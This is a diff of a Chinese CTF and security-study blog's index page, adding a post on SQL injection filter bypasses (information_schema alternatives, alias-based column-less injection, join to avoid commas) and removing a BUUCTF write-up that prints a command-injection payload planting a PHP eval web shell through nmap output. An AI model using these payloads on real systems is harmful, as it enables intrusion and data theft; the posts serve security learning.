@@ -139,6 +139,97 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Sql注入之无列名注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/22/Sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/">Sql注入之无列名注入</a>
+    </h1>
+  
+
+        
+        <a href="/2020/04/22/Sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2020-04-22T10:46:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-22</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>三月份参加校队考核的时候，遇到过无列名注入+bypass information_schema这个知识点，今天想做个记录（其实是填坑啦…）</p>
+<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>1、bypass information_schema<br>2、无列名注入<br>3、join绕过逗号过滤</p>
+<h4 id="Bypass-information-schema"><a href="#Bypass-information-schema" class="headerlink" title="Bypass information_schema"></a>Bypass information_schema</h4><p>就Sql注入来说，我们对information_schema这个库自然非常熟悉，他是Mysql5.0以上版本自带的数据库，包含着Mysql中所有数据库的信息，包括（table_schema、table_name、column_name等）。可以形象的理解为“数据库字典”。我们经常使用这个数据库爆出库名、表名、字段名；正因如此，有些waf会过滤“or”，这样我们既使用不了order by，同时也查询不到Information__schema这个库，自然得不到相应的信息。今天就来总结一下，如何在查询不了information_schema的情况下，依然能从数据库中得到信息；</p>
+<h5 id="一、使用innodb引擎绕过"><a href="#一、使用innodb引擎绕过" class="headerlink" title="一、使用innodb引擎绕过"></a>一、使用innodb引擎绕过</h5><pre><code>*注：这个方法并不适用所有情况，因为Mysql是默认关闭innodb引擎的；</code></pre><p>既然无法查询information_schema库，就想办法能不能通过其他库进行相关信息查询；对于Mysql来说，可以使用innodb引擎实现。<br>在Mysql中，存储数据的默认引擎分为两类。一类是在5.5.x之前的MyISAM数据存储引擎，另一类是5.5.x版本后的innodb引擎。并且mysql开发团队在5.5.x版本后将innodb作为数据库的默认引擎。</p>
+<p>而在mysql 5.6.x版本起，innodb增添了两个新表，一个是innodb_index_stats,另一个是innodb_table_stats。查阅官方文档，其对这两个新表的解释如下图：</p>
+<p>从官方文档我们可以发现两个有用的信息：</p>
+<pre><code>1、从5.6.x版本开始，innodb_index_stats和innodb_table_stats数据表是自动设置的。
+2、两个表都会存储数据库和对应的数据表。</code></pre><p>本地实验查询：<br>Mysql版本为5.6.40<br><img src="../images/50.jpg" alt="1"></p>
+<p>对innodb_index_stats进行查询：<br><img src="../images/49.jpg" alt="2"></p>
+<p>对innodb_table_stats进行查询：<br><img src="../images/51.jpg" alt="3"></p>
+<h4 id="二、sys-schema-auto-increment-columns绕过"><a href="#二、sys-schema-auto-increment-columns绕过" class="headerlink" title="二、sys.schema_auto_increment_columns绕过"></a>二、sys.schema_auto_increment_columns绕过</h4><p>上面也说过，对于innodb引擎，Mysql是默认关闭的；此时还可以使用sys.schema_table_statistics_with_buffer以及sys.schema_auto_increment_columns达到绕过的效果；<br>先来了解一下这两个是什么东西：</p>
+<pre><code>schema_auto_increment_columns，该视图的作用简单来说就是用来对表自增ID的监控。</code></pre><p>所以查询schema_auto_increment_columns只能查询含有自增字段的表名；</p>
+<pre><code>schema_table_statistics_with_buffer，查询表的统计信息，其中还包括InnoDB缓冲池统计信息</code></pre><p>所以查询schema_table_statistics_with_buffer，可以将上一种方法未查询到的表也显示出来：<br><img src="../images/52.jpg" alt="4"><br>至此，在过滤了information_schema的境况下，我们依然可以通过innodb引擎、sys.schema_table_statistics_with_buffer等方法进行查询。</p>
+<h3 id="无列名注入、Join绕过逗号"><a href="#无列名注入、Join绕过逗号" class="headerlink" title="无列名注入、Join绕过逗号"></a>无列名注入、Join绕过逗号</h3><p>虽然用以上方法，可以解决查询表的问题。但依然查询不到表的相关信息，这时就可以使用无列名注入；通过对要查询的列起别名，并查询这个别名将数据查出，达到未知列名，依旧查询到信息的效果；<br>可以使用</p>
+<pre><code>select `1` from (select 1,2,3 union select * from test)a;</code></pre><p>本地实验：<br><img src="../images/53.jpg" alt="5"><br><img src="../images/54.jpg" alt="6"><br>可以看见，我们对原本的name字段起了个别名”1”，并提供反引号进行查询”1”,将name字段的数据成功查询；<br>有时侯waf也会把反引号过滤，可以使用as，进行绕过：<br><img src="../images/55.jpg" alt="7"></p>
+<p>有时候，waf还会将逗号进行过滤，可以使用join方法进行绕过：</p>
+<pre><code>select b from (select * from (select 1)a join (select 2)aa join (select 3 as b)aaa union select * from test)x; &lt;=&gt;select b from(select 1,2,3 as b union select * from test);</code></pre><p><img src="../images/56.jpg" alt="8"></p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>主要记录下bypass information_schema的几种方法，以及在sql注入中遇到过的无列名注入和join绕过逗号的姿势；</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql注入</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/04/22/Sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-POP-exercise" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1336,103 +1427,6 @@ echo &quot;)&lt;br&gt;&quot;;</code></pre><p>最后将得到的源码进行base6
 
 
   
-    <article id="post-Online-tool" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/11/Online-tool/">Online-tool</a>
-    </h1>
-  
-
-        
-        <a href="/2020/04/11/Online-tool/" class="archive-article-date">
-  	<time datetime="2020-04-11T10:11:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="BUUCTF-Online-tool"><a href="#BUUCTF-Online-tool" class="headerlink" title="BUUCTF Online-tool"></a>BUUCTF Online-tool</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>1、PHP代码审计（escapeshellarg，escapeshellcmd连用产生漏洞）<br>2、利用Nmap GetShell</p>
-<p>点开题目，发现源码：</p>
-<pre><code>&lt;?php
-
-if (isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;])) {
-    $_SERVER[&apos;REMOTE_ADDR&apos;] = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;];
-}
-
-if(!isset($_GET[&apos;host&apos;])) {
-    highlight_file(__FILE__);
-} else {
-    $host = $_GET[&apos;host&apos;];
-    $host = escapeshellarg($host);
-    $host = escapeshellcmd($host);
-    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&apos;REMOTE_ADDR&apos;]);
-    echo &apos;you are in sandbox &apos;.$sandbox;
-    @mkdir($sandbox);
-    chdir($sandbox);
-    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);
-}</code></pre><p>发现最后一行有system()，猜测应该就是利用这个达到RCE的效果了；第一想法是利用“；”或“|”执行自己的命令；但发现$host经过两个函数escapeshellarg，escapeshellcmd处理；先来学习了解一下这两个函数：<br>escapeshellarg():将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的;<br>说白了就是将单引号进行转义，然后将前后部分分别用单引号括起来；<br>escapeshellcmd() ： 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。<br>说白了就是对”&amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF”进行反斜线转义；以及对于落单的单引号和双引号也会进行转义；<br>知道了这两个函数值后，我们回到题目，正常输入就是一个ip地址：127.0.0.1<br>拼接后就是对该IP地址扫描；那怎样才能有RCE的效果呢，尝试输入:</p>
-<pre><code>&apos; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &apos; 
-
-经过escapeshellarg()处理后，变为&apos;&apos;\&apos; &apos;&lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php&apos; \&apos;&apos;&apos; 
-经过escapeshellcmd()处理后，变为&apos;&apos;\\&apos; &apos;\&lt;\?php @eval\(\$_POST\[&quot;hack&quot;\]\);\?\&gt; -oG hack.php&apos; \\&apos;&apos;\&apos;,即为\ &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php;</code></pre><p>这时回返回给文件所在目录；使用蚁剑连接，拿flag</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">PHP代码审计，RCE</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/04/11/Online-tool/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
@@ -1587,6 +1581,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">POP,反序列化</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
             
             <div class="clearfix"></div>
